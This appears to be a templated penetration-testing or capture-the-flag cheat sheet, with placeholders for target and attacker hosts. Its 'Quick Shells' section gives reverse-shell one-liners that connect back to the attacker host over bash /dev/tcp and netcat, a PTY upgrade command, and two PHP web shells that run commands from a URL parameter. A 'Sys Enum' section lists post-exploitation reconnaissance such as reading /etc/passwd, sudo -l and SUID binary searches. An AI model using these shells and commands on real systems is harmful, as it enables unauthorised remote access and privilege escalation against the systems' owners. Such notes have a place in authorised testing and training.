## {{TARGET}}

### Update `/etc/hosts`
```bash
{{RHOST}}   {{TARGET}}
```
 
### Set Aliases
```bash
nano ~/.bash_aliases
{{QUICK_DIR}}
source ~/.profile
```

### Quick Shells
#### Unix
```bash
bash -i >& /dev/tcp/{{LHOST}}/9000 0>&1
nc -e /bin/sh {{LHOST}} 9000
nc {{LHOST}} 9000

# Upgrade Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### PHP
```php
<?php echo shell_exec($_GET['cmd']);?>
<?php echo system($_GET["cmd"]) ?>
```

### Sys Enum
#### Unix
```bash
cat /etc/passwd
sudo -l
ss -tnl
netstat -lntp
groups
find / -perm /4000 2> /dev/null
find / -perm /6000 2> /dev/null
```
